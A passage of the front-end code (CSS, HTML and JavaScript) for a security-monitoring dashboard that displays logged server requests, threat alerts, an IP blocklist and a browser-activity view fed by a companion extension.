.kw .x{font-family:var(--mono);color:var(--faint);font-size:12px}
.blockform{display:flex;gap:8px;padding:12px 16px;border-bottom:1px solid var(--line)}
.blockform input{flex:1;min-width:0;background:var(--bg);border:1px solid var(--line-2);border-radius:8px;color:var(--text);
  padding:7px 10px;font-family:var(--mono);font-size:12px}

/* drawer */
.scrim{position:fixed;inset:0;background:rgba(2,6,16,.6);opacity:0;pointer-events:none;transition:.2s;z-index:80}
.scrim.open{opacity:1;pointer-events:auto}
.drawer{position:fixed;top:0;right:0;height:100vh;height:100dvh;width:min(520px,100%);background:var(--panel);border-left:1px solid var(--line-2);
  transform:translateX(100%);transition:transform .22s ease;z-index:90;display:flex;flex-direction:column}
.drawer.open{transform:none}
.drawer-h{display:flex;align-items:center;gap:10px;padding:16px 18px;border-bottom:1px solid var(--line)}
.drawer-b{flex:1;overflow:auto;padding:16px 18px}
.kv{display:grid;grid-template-columns:110px 1fr;gap:6px 12px;font-size:12.5px;margin-bottom:16px}
.kv dt{color:var(--faint)}
.kv dd{font-family:var(--mono);word-break:break-all;color:var(--text)}
.sect{font-size:11px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--faint);margin:14px 0 8px}
.hits{width:100%;font-size:12px}
.hits td,.hits th{padding:6px 8px;cursor:default}
.drawer-f{display:flex;gap:8px;padding:14px 18px;border-top:1px solid var(--line)}

/* toast */
.toasts{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);display:flex;flex-direction:column;gap:8px;z-index:100}
.toast{background:var(--panel-2);border:1px solid var(--line-2);color:var(--text);padding:10px 14px;border-radius:10px;font-size:13px;
  box-shadow:0 10px 30px rgba(0,0,0,.4);animation:up .2s ease}
.toast.err{border-color:rgba(244,63,94,.5)}
@keyframes up{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}

[hidden]{display:none!important}
.tabs{display:flex;gap:4px;background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:3px}
.tab{background:transparent;border:0;color:var(--muted);font-weight:600;font-size:13px;padding:6px 14px;border-radius:7px;display:inline-flex;gap:6px;align-items:center}
.tab:hover{color:var(--text)}
.tab[aria-selected="true"]{background:var(--panel-2);color:var(--text);box-shadow:inset 0 0 0 1px var(--line-2)}
.badge{background:var(--crit);color:#fff;font-size:10.5px;border-radius:999px;padding:1px 6px;font-family:var(--mono)}
.bw-bar{display:flex;align-items:center;gap:12px;margin-bottom:14px;flex-wrap:wrap}
.days{display:flex;gap:6px;flex-wrap:wrap}
.bw-grid{display:grid;grid-template-columns:minmax(0,1.6fr) minmax(300px,1fr);gap:16px;align-items:start}
.hours{display:flex;align-items:flex-end;gap:3px;height:150px;padding:14px 16px 26px;position:relative}
.hour{flex:1;display:flex;flex-direction:column;justify-content:flex-end;height:100%;position:relative;min-width:0}
.hour .b{background:var(--accent);opacity:.75;border-radius:3px 3px 0 0;min-height:1px}
.hour .f{background:var(--crit);border-radius:3px 3px 0 0}
.hour .l{position:absolute;bottom:-18px;left:50%;transform:translateX(-50%);font-size:10px;color:var(--faint);font-family:var(--mono)}
.setup{padding:12px 18px 4px 36px;display:flex;flex-direction:column;gap:12px;font-size:13px;line-height:1.55}
.copyrow{display:flex;align-items:center;gap:8px;margin-top:8px;flex-wrap:wrap}
.copyrow .lbl{width:130px;color:var(--muted);font-size:12px}
.copyrow code{font-family:var(--mono);font-size:12px;background:var(--bg);border:1px solid var(--line-2);border-radius:6px;padding:4px 8px;max-width:100%;overflow:hidden;text-overflow:ellipsis}
.note{font-size:12px;color:var(--faint);line-height:1.5;padding:0 16px 14px}
.reason{font-size:12px;color:var(--muted);margin-top:3px}
.url{font-family:var(--mono);font-size:11.5px;color:var(--faint);word-break:break-all;margin-top:2px}
@media (max-width:1100px){.bw-grid{grid-template-columns:1fr}}
@media (max-width:1280px){.grid{grid-template-columns:minmax(0,1fr) minmax(0,1fr)}.col.main{grid-column:1/-1}.kpis{grid-template-columns:repeat(3,1fr)}}
@media (max-width:760px){.grid{grid-template-columns:1fr}.kpis{grid-template-columns:repeat(2,1fr)}.page{padding:12px}
  .top{padding:10px 12px}.clock{display:none}#map{height:240px}.catrow{grid-template-columns:100px 1fr 30px}}
@media (prefers-reduced-motion:reduce){*{transition:none!important;animation:none!important}}
</style>
</head>
<body>
<header class="top">
  <div class="brand"><div class="brand-mark">🛡</div><div>SOC Threat Dashboard<small id="rules-lbl">Loading rules…</small></div></div>
  <nav class="tabs" role="tablist" aria-label="Views">
    <button class="tab" role="tab" id="tab-server" aria-selected="true" data-view="server">🌐 Server traffic</button>
    <button class="tab" role="tab" id="tab-browser" aria-selected="false" data-view="browser">🧭 My browser <span class="badge" id="bw-badge" hidden>0</span></button>
  </nav>
  <span class="pill" id="status"><span class="dot"></span><span id="status-t">Connecting…</span></span>
  <div class="spacer"></div>
  <span class="clock" id="clock"></span>
  <button class="btn ghost net-only" id="pause-btn" aria-pressed="false">⏸ Pause</button>
  <button class="btn primary net-only" id="demo-btn">▶ Run demo traffic</button>
</header>

<main class="page" id="view-server">
  <section class="kpis" aria-label="Summary">
    <div class="kpi" style="--c:var(--accent)"><div class="kpi-l">Events</div><div class="kpi-v" id="k-total">0</div><div class="kpi-s" id="k-total-s">all time</div></div>
    <div class="kpi" style="--c:var(--crit)"><div class="kpi-l">Critical</div><div class="kpi-v" id="k-crit">0</div><div class="kpi-s">risk ≥ 80</div></div>
    <div class="kpi" style="--c:var(--high)"><div class="kpi-l">High</div><div class="kpi-v" id="k-high">0</div><div class="kpi-s">risk 55–79</div></div>
    <div class="kpi" style="--c:var(--low)"><div class="kpi-l">Unique sources</div><div class="kpi-v" id="k-ips">0</div><div class="kpi-s">in current window</div></div>
    <div class="kpi" style="--c:var(--med)"><div class="kpi-l">Alerts</div><div class="kpi-v" id="k-alerts">0</div><div class="kpi-s">deduplicated</div></div>
    <div class="kpi" style="--c:#a78bfa"><div class="kpi-l">Blocked IPs</div><div class="kpi-v" id="k-block">0</div><div class="kpi-s">manual + automatic</div></div>
  </section>

  <div class="grid">
    <div class="col main">
      <section class="card">
        <div class="card-h"><span class="card-t">Threat map</span><span class="spacer"></span>
          <div class="legend"><span><i style="background:var(--crit)"></i>Critical</span><span><i style="background:var(--high)"></i>High</span>
          <span><i style="background:var(--med)"></i>Medium</span><span><i style="background:var(--low)"></i>Low</span></div></div>
        <div id="map"></div>
      </section>
      <section class="card">
        <div class="card-h"><span class="card-t">Event log</span><span class="card-sub" id="ev-count">0 shown</span></div>
        <div class="filters" role="toolbar" aria-label="Severity filter" id="sev-filters"></div>
        <div class="filters" style="border-bottom:none;padding-top:0"><input class="search" id="search" type="search" placeholder="Filter by IP, path, tag, country…" aria-label="Search events"></div>
        <div class="tbl-wrap">
          <table><thead><tr><th>Time</th><th>Source</th><th>Request &amp; findings</th><th>Risk</th></tr></thead>
          <tbody id="ev-body"></tbody></table>
        </div>
      </section>
    </div>

    <div class="col">
      <section class="card">
        <div class="card-h"><span class="card-t">Live alerts</span><span class="spacer"></span><button class="btn sm ghost" id="clear-alerts">Clear view</button></div>
        <div class="card-b" id="alerts"></div>
      </section>
      <section class="card">
        <div class="card-h"><span class="card-t">Threat categories</span><span class="card-sub">current window</span></div>
        <div class="card-b" id="cats" style="padding:8px 0"></div>
      </section>
    </div>

    <div class="col">
      <section class="card">
        <div class="card-h"><span class="card-t">Blocklist</span><span class="card-sub" id="bl-count"></span></div>
        <form class="blockform" id="block-form" autocomplete="off">
          <input id="block-ip" placeholder="IP address to block" aria-label="IP address to block" inputmode="decimal">
          <button class="btn danger sm" type="submit">Block</button>
        </form>
        <div class="card-b" id="blocklist" style="max-height:260px"></div>
      </section>
      <section class="card">
        <div class="card-h"><span class="card-t">Top sources</span><span class="card-sub">by peak risk</span></div>
        <div class="card-b" id="sources"></div>
      </section>
      <section class="card">
        <div class="card-h"><span class="card-t">Matched indicators</span><span class="card-sub">most frequent</span></div>
        <div class="card-b" id="keywords"></div>
      </section>
    </div>
  </div>
</main>

<main class="page" id="view-browser" hidden>
  <div class="bw-bar">
    <div class="days" id="bw-days" role="group" aria-label="Day"></div>
    <span class="spacer" style="flex:1"></span>
    <span class="pill" id="bw-conn"><span class="dot"></span><span id="bw-conn-t">Checking…</span></span>
  </div>
  <section class="kpis" aria-label="Browser summary">
    <div class="kpi" style="--c:var(--accent)"><div class="kpi-l">Requests</div><div class="kpi-v" id="bk-req">0</div><div class="kpi-s">everything the browser fetched</div></div>
    <div class="kpi" style="--c:var(--low)"><div class="kpi-l">Pages opened</div><div class="kpi-v" id="bk-pages">0</div><div class="kpi-s">top-level page loads</div></div>
    <div class="kpi" style="--c:#a78bfa"><div class="kpi-l">Sites contacted</div><div class="kpi-v" id="bk-sites">0</div><div class="kpi-s">including trackers and CDNs</div></div>
    <div class="kpi" style="--c:var(--med)"><div class="kpi-l">New sites</div><div class="kpi-v" id="bk-new">0</div><div class="kpi-s">never seen before this day</div></div>
    <div class="kpi" style="--c:var(--crit)"><div class="kpi-l">Flagged</div><div class="kpi-v" id="bk-flag">0</div><div class="kpi-s">medium risk or higher</div></div>
    <div class="kpi" style="--c:var(--high)"><div class="kpi-l">Blocked</div><div class="kpi-v" id="bk-block">0</div><div class="kpi-s">stopped by your blocklist</div></div>
  </section>
  <div class="bw-grid">
    <div class="col">
      <section class="card" id="bw-setup" hidden>
        <div class="card-h"><span class="card-t">Connect your browser</span><span class="card-sub">one-time setup, about 2 minutes</span></div>
        <ol class="setup">
          <li>Open <b>chrome://extensions</b> (Edge: edge://extensions), switch on <b>Developer mode</b>, click <b>Load unpacked</b> and choose the <span class="mono">soc-browser-extension</span> folder.</li>
          <li>Click the extension's icon, then <b>Settings</b>, and paste these two values:
            <div class="copyrow"><span class="lbl">Dashboard address</span><code id="bw-endpoint">…</code><button class="btn sm ghost" data-copy="bw-endpoint">Copy</button></div>
            <div class="copyrow"><span class="lbl">Browser token</span><code id="bw-token">••••••••••••</code><button class="btn sm ghost" id="bw-show">Show</button><button class="btn sm ghost" data-copy="bw-token">Copy</button></div>
          </li>
          <li>Press <b>Test connection</b>. Requests appear here within a few seconds.</li>
        </ol>
        <p class="note">Only this computer can see your browsing data. Full URLs are kept only for flagged requests; everything older than <span id="bw-ret">30</span> days is deleted.</p>
      </section>
      <section class="card">
        <div class="card-h"><span class="card-t">Activity by hour</span><span class="card-sub" id="bw-hours-sub"></span></div>
        <div class="hours" id="bw-hours" role="img" aria-label="Requests per hour"></div>
      </section>
      <section class="card">
        <div class="card-h"><span class="card-t">Flagged requests</span><span class="card-sub">medium risk or higher</span></div>
        <div class="card-b" id="bw-flagged" style="max-height:520px"></div>
      </section>
      <section class="card">
        <div class="card-h"><span class="card-t">Most-contacted sites</span></div>
        <div class="tbl-wrap" style="max-height:520px"><table><thead><tr><th>Site</th><th>Requests</th><th>Pages</th><th>Highest risk</th><th></th></tr></thead>
        <tbody id="bw-top"></tbody></table></div>
      </section>
    </div>
    <div class="col">
      <section class="card">
        <div class="card-h"><span class="card-t">New sites</span><span class="card-sub">first contact on this day</span></div>
        <div class="card-b" id="bw-new" style="max-height:380px"></div>
      </section>
      <section class="card">
        <div class="card-h"><span class="card-t">Blocked in your browser</span><span class="card-sub" id="bw-bl-count"></span></div>
        <form class="blockform" id="bw-block-form" autocomplete="off">
          <input id="bw-block-site" placeholder="Site to block, e.g. example.top" aria-label="Site to block">
          <button class="btn danger sm" type="submit">Block</button>
        </form>
        <div class="card-b" id="bw-blocklist" style="max-height:260px"></div>
      </section>
      <section class="card">
        <div class="card-h"><span class="card-t">Request types</span></div>
        <div id="bw-types" style="padding:8px 0"></div>
      </section>
      <section class="card">
        <div class="card-h"><span class="card-t">Scam-domain feed</span></div>
        <div id="bw-feed" class="note" style="padding:12px 16px"></div>
      </section>
    </div>
  </div>
</main>

<div class="scrim" id="scrim"></div>
<aside class="drawer" id="drawer" role="dialog" aria-modal="true" aria-labelledby="dr-title">
  <div class="drawer-h"><span class="card-t" id="dr-title">Event</span><span class="spacer" style="flex:1"></span><button class="btn sm ghost" id="dr-close" aria-label="Close">✕</button></div>
  <div class="drawer-b" id="dr-body"></div>
  <div class="drawer-f" id="dr-foot"></div>
</aside>
<div class="toasts" id="toasts" aria-live="polite"></div>

<script>
"use strict";
const SEV_ORDER = ["critical","high","medium","low","info"];
const SEV_HEX = {critical:"#f43f5e", high:"#fb923c", medium:"#facc15", low:"#38bdf8", info:"#64748b"};
const CAT_HEX = {exploit:"#f43f5e", honeypot:"#e879f9", ransomware_extortion:"#fb7185", malware_delivery:"#fb923c",
  exfiltration:"#f97316", financial_fraud:"#facc15", phishing:"#fde047", identity_theft:"#a78bfa",
  social_engineering:"#c084fc", reconnaissance:"#38bdf8", bot_automation:"#2dd4bf", emerging_2025:"#4ade80"};
const S = {events:[], alerts:[], lastEv:0, lastAl:0, sev:"all", q:"", paused:false, inflight:false,
  labels:{}, markers:{}, blocklist:{}, alertsClearedAt:0, openId:null};
const $ = id => document.getElementById(id);
const esc = v => String(v ?? "").replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
const fmtTime = iso => { const d = new Date(iso); return isNaN(d) ? "" : d.toLocaleTimeString([], {hour:"2-digit",minute:"2-digit",second:"2-digit",hourCycle:"h23"}); };
const label = c => S.labels[c] || String(c).replace(/_/g," ").toLowerCase().replace(/^./, m => m.toUpperCase());
const flag = cc => (cc && /^[A-Z]{2}$/.test(cc)) ? String.fromCodePoint(...[...cc].map(ch => 127397 + ch.charCodeAt(0))) : "";
const sevPill = s => `<span class="sev ${esc(s)}">${esc(s)}</span>`;
const riskCell = (r, s) => `<div class="risk"><div class="bar"><span style="width:${Math.max(2, Math.min(100, r))}%;background:${SEV_HEX[s] || SEV_HEX.info}"></span></div><span class="n">${Number(r) || 0}</span></div>`;
const isIP = v => /^(\d{1,3}\.){3}\d{1,3}$/.test(v) || /^[0-9a-f:]+$/i.test(v) && v.includes(":");

function toast(msg, err) {
  const t = document.createElement("div");
  t.className = "toast" + (err ? " err" : ""); t.textContent = msg;
  $("toasts").appendChild(t); setTimeout(() => t.remove(), 3800);
}

async function api(path, opts = {}, retried = false) {
  const headers = Object.assign({"Content-Type": "application/json"}, opts.headers || {});
  let tok = null; try { tok = sessionStorage.getItem("socToken"); } catch (e) {}
  if (tok) headers["X-SOC-Token"] = tok;
  const res = await fetch(path, Object.assign({}, opts, {headers}));
  if (res.status === 401 && !retried) {
    const t = prompt("Admin token required for this action:");
    if (t) { try { sessionStorage.setItem("socToken", t); } catch (e) {} return api(path, opts, true); }
  }
  let data = null; try { data = await res.json(); } catch (e) {}
  if (!res.ok) throw new Error((data && data.error) || `HTTP ${res.status}`);
  return data;
}

/* ── map ── */
let map = null;
function initMap() {
  if (typeof L === "undefined") {
    $("map").innerHTML = '<div class="empty"><strong>Map unavailable</strong>The map library could not load (offline?). All other panels still work.</div>';
    return;
  }
  map = L.map("map", {worldCopyJump: true, minZoom: 1}).setView([25, 10], 2);
  L.tileLayer("https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png",
    {subdomains: "abcd", maxZoom: 18, attribution: "&copy; OpenStreetMap contributors &copy; CARTO"}).addTo(map);
}
function popupHtml(e, n) {
  return `<b class="mono">${esc(e.ip)}</b><br>${esc(e.city)}${e.country ? ", " + esc(e.country) : ""}<br>${esc(e.org || "")}<br>` +
         `Peak risk <b>${Number(e.risk)}</b> · ${n} event${n === 1 ? "" : "s"}`;
}
function upsertMarker(e) {
  if (!map || typeof e.lat !== "number" || typeof e.lon !== "number") return;
  const m = S.markers[e.ip];
  if (m) {
    m.n++;
    if (e.risk > m.risk) { m.risk = e.risk; m.layer.setStyle({color: SEV_HEX[e.severity], fillColor: SEV_HEX[e.severity]}); m.ev = e; }
    m.layer.setRadius(Math.min(5 + m.n * 0.5, 14)); m.layer.setPopupContent(popupHtml(m.ev, m.n));
    return;
  }
  const c = SEV_HEX[e.severity] || SEV_HEX.info;
  const layer = L.circleMarker([e.lat, e.lon], {radius: 6, color: c, fillColor: c, fillOpacity: .5, weight: 1.5}).addTo(map);
  layer.bindPopup(popupHtml(e, 1));
  S.markers[e.ip] = {layer, risk: e.risk, n: 1, ev: e};
}

/* ── events ── */
function sevCounts() { const c = {all: S.events.length}; SEV_ORDER.forEach(s => c[s] = 0); S.events.forEach(e => c[e.severity]++); return c; }
function renderFilters() {
  const c = sevCounts();
  $("sev-filters").innerHTML = ["all", ...SEV_ORDER].map(s =>
    `<button class="chip" data-sev="${s}" aria-pressed="${S.sev === s}">${s === "all" ? "All" : s[0].toUpperCase() + s.slice(1)}<b>${c[s]}</b></button>`).join("");
}
function matchesQuery(e, q) {
  return [e.ip, e.path, e.query, e.city, e.country, e.cc, e.org, e.ua, e.method, ...(e.threat_tags || [])]
    .some(v => String(v || "").toLowerCase().includes(q));
}
function renderEvents() {
  const q = S.q.trim().toLowerCase();
  const rows = S.events.filter(e => (S.sev === "all" || e.severity === S.sev) && (!q || matchesQuery(e, q))).slice(0, 300);
  $("ev-count").textContent = `${rows.length} shown · ${S.events.length} loaded`;
  if (!rows.length) {
    $("ev-body").innerHTML = S.events.length
      ? '<tr><td colspan="4" class="empty"><strong>No matches</strong>Try another filter or search.</td></tr>'
      : '<tr><td colspan="4" class="empty"><strong>Waiting for traffic</strong>Send requests to <span class="mono">/log</span> or click “Run demo traffic”.</td></tr>';
    return;
  }
  $("ev-body").innerHTML = rows.map(e => {
    const req = e.path + (e.query ? "?" + e.query : "");
    const tags = (e.threat_tags || []).slice(0, 2).map(t => `<span class="tag">${esc(label(t.toLowerCase()))}</span>`).join("") +
                 ((e.threat_tags || []).length > 2 ? `<span class="tag">+${e.threat_tags.length - 2}</span>` : "") ||
                 '<span style="color:var(--faint)">—</span>';
    return `<tr class="sev-${esc(e.severity)}" data-id="${Number(e.id)}" tabindex="0">
      <td class="mono" style="color:var(--muted)">${esc(fmtTime(e.time))}</td>
      <td><div class="ip">${esc(e.ip)}</div>
        <div class="loc sub">${e.blocked ? '<span style="color:#fda4af">⛔ blocked</span> · ' : ""}${flag(e.cc)} ${esc(e.city)}${e.cc && e.cc !== "LAN" ? ", " + esc(e.cc) : ""}</div></td>
      <td><div class="req" title="${esc(req)}"><b>${esc(e.method)}</b>${esc(req)}</div><div class="tags">${tags}</div></td>
      <td>${riskCell(e.risk, e.severity)}</td></tr>`;
  }).join("");
}

/* ── alerts ── */
function renderAlerts() {
  const list = S.alerts.filter(a => a.id > S.alertsClearedAt).slice(0, 120);
  $("alerts").innerHTML = list.length ? list.map(a => `
    <div class="item"><div class="item-top">${sevPill(a.severity)}<span class="mono" style="font-size:11.5px;color:var(--faint)">${esc(fmtTime(a.time))}</span></div>
    <div class="item-msg">${esc(a.reason)}</div>
    <div class="item-meta"><span class="ip">${esc(a.ip)}</span> · ${esc(label(String(a.category).toLowerCase()))} · risk ${Number(a.risk)}</div></div>`).join("")
    : '<div class="empty"><strong>No alerts</strong>Alerts appear here when a request matches high-impact rules.</div>';
}

/* ── side panels ── */
function renderCats(cats) {
  const entries = Object.entries(cats || {});
  if (!entries.length) { $("cats").innerHTML = '<div class="empty">No threat categories matched yet.</div>'; return; }
  const max = Math.max(...entries.map(([, v]) => v));
  $("cats").innerHTML = entries.map(([c, v]) => `<div class="catrow"><span class="lbl" title="${esc(label(c))}">${esc(label(c))}</span>
    <div class="bar"><span style="width:${(v / max) * 100}%;background:${CAT_HEX[c] || "#94a3b8"}"></span></div><span class="cnt">${v}</span></div>`).join("");
}
function renderSources(top) {
  $("sources").innerHTML = (top && top.length) ? top.map(s => `<div class="src">
    <span class="ip">${esc(s.ip)}</span><span class="grow loc">${flag(s.cc)} ${esc(s.city || "")}</span>
    <span class="mono" style="color:var(--faint);font-size:12px">${s.count}×</span>${sevPill(s.severity)}
    ${s.blocked ? '<span class="tag">blocked</span>' : `<button class="btn sm ghost" data-block="${esc(s.ip)}" title="Block ${esc(s.ip)}">Block</button>`}
    </div>`).join("") : '<div class="empty">No sources yet.</div>';
}
function renderKeywords() {
  const agg = new Map();
  S.events.forEach(e => (e.keyword_hits || []).forEach(h => {
    const k = h.category + "|" + h.keyword; const cur = agg.get(k) || {cat: h.category, kw: h.keyword, n: 0}; cur.n++; agg.set(k, cur);
  }));
  const top = [...agg.values()].sort((a, b) => b.n - a.n).slice(0, 25);
  $("keywords").innerHTML = top.length ? top.map(h => `<div class="kw"><span class="k" title="${esc(h.kw)}">${esc(h.kw.replace(/^regex:/, "pattern: "))}</span>
    <span class="c" style="color:${CAT_HEX[h.cat] || "var(--muted)"}">${esc(label(h.cat))}</span><span class="x">${h.n}×</span></div>`).join("")
    : '<div class="empty">No indicators matched yet.</div>';
}
function renderBlocklist() {
  const entries = Object.entries(S.blocklist);
  $("bl-count").textContent = entries.length ? `${entries.length} blocked` : "";
  $("blocklist").innerHTML = entries.length ? entries.map(([ip, info]) => `<div class="item">
    <div class="item-top"><span class="ip">${esc(ip)}</span><button class="btn sm ghost" data-unblock="${esc(ip)}">Unblock</button></div>
    <div class="item-msg" style="color:var(--muted)">${esc(info.reason)}</div>
    <div class="item-meta">${esc(info.source)} · ${esc(fmtTime(info.time))}</div></div>`).join("")
    : '<div class="empty">No blocked IPs.</div>';
}
function renderStats(st) {
  S.labels = st.labels || S.labels;
  $("k-total").textContent = st.total.toLocaleString();
  $("k-total-s").textContent = `${st.window.toLocaleString()} in window`;
  $("k-crit").textContent = st.severity.critical; $("k-high").textContent = st.severity.high;
  $("k-ips").textContent = st.unique_ips; $("k-alerts").textContent = st.alerts; $("k-block").textContent = st.blocklist;
  $("rules-lbl").textContent = `${st.rules} detection rules · 12 categories`;
  renderCats(st.categories); renderSources(st.top_sources);
}

/* ── drawer ── */
function openEvent(id) {
  const e = S.events.find(x => x.id === id); if (!e) return;
  S.openId = id;
  $("dr-title").innerHTML = `Event #${e.id} ${sevPill(e.severity)}`;
  const kv = [["Time", new Date(e.time).toLocaleString()], ["Source IP", e.ip], ["Location", [e.city, e.country].filter(Boolean).join(", ") || "Unknown"],
    ["Network", e.org || "—"], ["Method", e.method], ["Path", e.path], ["Query", e.query || "—"], ["User-Agent", e.ua || "(missing)"],
    ["Referrer", e.referrer || "—"], ["Risk", `${e.risk}/100 (geo +${e.geo_risk || 0})`], ["Rate", `${e.rate_count} req / 60s`],
    ["Status", e.blocked ? "Blocked (403)" : "Allowed"]];
  const hits = (e.keyword_hits || []);
  $("dr-body").innerHTML = `<dl class="kv">${kv.map(([k, v]) => `<dt>${esc(k)}</dt><dd>${esc(v)}</dd>`).join("")}</dl>
    <div class="sect">Tags</div><div>${(e.threat_tags || []).map(t => `<span class="tag">${esc(label(t.toLowerCase()))}</span>`).join("") || '<span style="color:var(--faint)">None</span>'}</div>
    <div class="sect">Matched indicators</div>
    ${hits.length ? `<table class="hits"><thead><tr><th>Category</th><th>Indicator</th><th>Found in</th><th>Weight</th></tr></thead><tbody>
      ${hits.map(h => `<tr><td>${esc(label(h.category))}</td><td class="mono">${esc(h.keyword.replace(/^regex:/, "pattern: "))}</td><td>${esc(h.source)}</td><td class="mono">+${Number(h.weight)}</td></tr>`).join("")}
      </tbody></table>` : '<div style="color:var(--faint);font-size:12.5px">No rule matched — risk comes from geo / rate / request anomalies only.</div>'}`;
  const isBlocked = !!S.blocklist[e.ip];
  $("dr-foot").innerHTML = `${isBlocked ? `<button class="btn" data-unblock="${esc(e.ip)}">Unblock ${esc(e.ip)}</button>` : `<button class="btn danger" data-block="${esc(e.ip)}">Block ${esc(e.ip)}</button>`}
    <button class="btn ghost" id="copy-json">Copy JSON</button>`;
  $("scrim").classList.add("open"); $("drawer").classList.add("open"); $("dr-close").focus();
}
function closeDrawer() { $("scrim").classList.remove("open"); $("drawer").classList.remove("open"); S.openId = null; }

/* ── actions ── */
async function blockIp(ip, reason) {
  try { await api("/api/block", {method: "POST", body: JSON.stringify({ip, reason: reason || "Manual block via dashboard"})}); toast(`Blocked ${ip}`); await refreshBlocklist(); }
  catch (e) { toast(`Block failed: ${e.message}`, true); }
}
async function unblockIp(ip) {
  try { await api("/api/unblock", {method: "POST", body: JSON.stringify({ip})}); toast(`Unblocked ${ip}`); await refreshBlocklist(); }
  catch (e) { toast(`Unblock failed: ${e.message}`, true); }
}
async function refreshBlocklist() { S.blocklist = await api("/api/blocklist"); renderBlocklist(); if (S.openId) openEvent(S.openId); }

document.addEventListener("click", ev => {
  const t = ev.target.closest("[data-block],[data-unblock],[data-sev],tr[data-id],#copy-json");
  if (!t) return;
  if (t.dataset.block) blockIp(t.dataset.block);
  else if (t.dataset.unblock) unblockIp(t.dataset.unblock);
  else if (t.dataset.sev) { S.sev = t.dataset.sev; renderFilters(); renderEvents(); }
  else if (t.dataset.id) openEvent(Number(t.dataset.id));
  else if (t.id === "copy-json") {
    const e = S.events.find(x => x.id === S.openId);
    navigator.clipboard?.writeText(JSON.stringify(e, null, 2)).then(() => toast("Event JSON copied"), () => toast("Copy failed", true));
  }
});
document.addEventListener("keydown", ev => {
  if (ev.key === "Escape") closeDrawer();
  if (ev.key === "Enter" && ev.target.matches && ev.target.matches("tr[data-id]")) openEvent(Number(ev.target.dataset.id));
});
$("scrim").addEventListener("click", closeDrawer);
$("dr-close").addEventListener("click", closeDrawer);
$("search").addEventListener("input", ev => { S.q = ev.target.value; renderEvents(); });
$("clear-alerts").addEventListener("click", () => { S.alertsClearedAt = S.lastAl; renderAlerts(); });
$("block-form").addEventListener("submit", ev => {
  ev.preventDefault(); const ip = $("block-ip").value.trim();
  if (!isIP(ip)) { toast("Enter a valid IPv4 or IPv6 address", true); return; }
  $("block-ip").value = ""; blockIp(ip);
});
$("pause-btn").addEventListener("click", () => {
  S.paused = !S.paused;
  $("pause-btn").textContent = S.paused ? "▶ Resume" : "⏸ Pause";
  $("pause-btn").setAttribute("aria-pressed", S.paused);
  setStatus(S.paused ? "paused" : "live");
  if (!S.paused) poll();
});
$("demo-btn").addEventListener("click", async () => {
  const b = $("demo-btn"); b.disabled = true;
  try { const r = await api("/api/demo", {method: "POST"}); toast(`Demo started — ${r.events} requests over ~15s`); }
  catch (e) { toast(e.message === "already running" ? "Demo already running" : `Demo failed: ${e.message}`, true); }
  setTimeout(() => b.disabled = false, 4000);
});

function setStatus(mode) {
  const p = $("status"); p.classList.remove("down", "paused");
  if (mode === "down") { p.classList.add("down"); $("status-t").textContent = "Disconnected"; }
  else if (mode === "paused") { p.classList.add("paused"); $("status-t").textContent = "Paused"; }
  else $("status-t").textContent = "Live";
}

/* ── polling ── */
async function poll() {
  if (S.paused || S.inflight) return;
  S.inflight = true;
  try {
    const [ev, al, st, bl] = await Promise.all([
      api(`/api/logs?after_id=${S.lastEv}&limit=500`), api(`/api/alerts?after_id=${S.lastAl}&limit=500`),
      api("/api/stats"), api("/api/blocklist")]);
    if (ev.length) {
      S.lastEv = ev[ev.length - 1].id;
      ev.forEach(upsertMarker);
      S.events = ev.slice().reverse().concat(S.events).slice(0, 1000);
    }
    if (al.length) { S.lastAl = al[al.length - 1].id; S.alerts = al.slice().reverse().concat(S.alerts).slice(0, 300); }
    S.blocklist = bl || {};
    renderStats(st); renderFilters(); renderEvents(); renderAlerts(); renderKeywords(); renderBlocklist();
    setStatus("live");
  } catch (e) { setStatus("down"); }
  finally { S.inflight = false; }
}

setInterval(() => { $("clock").textContent = new Date().toISOString().replace("T", " ").slice(0, 19) + " UTC"; }, 1000);
/* ══ My browser ══ */
const BW = {day: null, days: [], timer: null, summary: null, token: null, blocklist: []};
const localDay = (d = new Date()) => `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, "0")}-${String(d.getDate()).padStart(2, "0")}`;
function dayLabel(day) {
  const today = localDay(), y = new Date(); y.setDate(y.getDate() - 1);
  if (day === today) return "Today"; if (day === localDay(y)) return "Yesterday";
  const [Y, M, D] = day.split("-").map(Number); return new Date(Y, M - 1, D).toLocaleDateString([], {weekday: "short", month: "short", day: "numeric"});
}
function setView(v) {
  ["server", "browser"].forEach(n => { $("view-" + n).hidden = n !== v; $("tab-" + n).setAttribute("aria-selected", n === v); });
  document.querySelectorAll(".net-only").forEach(el => el.hidden = v !== "server");
  try { history.replaceState(null, "", "#" + v); } catch (e) {}
  clearInterval(BW.timer);
  if (v === "browser") { loadBrowser(); BW.timer = setInterval(() => { if (!BW.day || BW.day === localDay()) loadBrowser(); }, 5000); }
  else if (typeof map !== "undefined" && map && map.invalidateSize) setTimeout(() => map.invalidateSize(), 60);
}
async function loadBrowser() {
  try {
    const [status, days, bl] = await Promise.all([api("/api/browser/status"), api("/api/browser/days"), api("/api/browser/blocklist")]);
    BW.days = days; BW.blocklist = bl;
    if (!BW.day) BW.day = localDay();
    const sum = await api("/api/browser/summary?day=" + encodeURIComponent(BW.day));
    BW.summary = sum; renderBrowser(status, sum);
  } catch (e) { $("bw-conn-t").textContent = "Can't load: " + e.message; $("bw-conn").classList.add("down"); }
}
function renderBrowser(st, sm) {
  const c = st.clients[0];
  $("bw-conn").classList.toggle("down", !st.connected);
  $("bw-conn-t").textContent = c ? (st.connected ? `${c.name} connected · last report ${c.last_seen_s}s ago` : `${c.name} last reported ${Math.round(c.last_seen_s / 60)} min ago`) : "No browser connected yet";
  $("bw-setup").hidden = !!c && !$("bw-setup").dataset.pinned;
  if (!$("bw-setup").hidden && !BW.token) api("/api/browser/token").then(t => { BW.token = t.token; $("bw-endpoint").textContent = t.endpoint; }).catch(() => {});
  $("bw-ret").textContent = st.retention_days;
  const today = localDay(), dayset = [today, ...BW.days.map(d => d.day).filter(d => d !== today)].slice(0, 7);
  if (BW.day && !dayset.includes(BW.day)) dayset.push(BW.day);
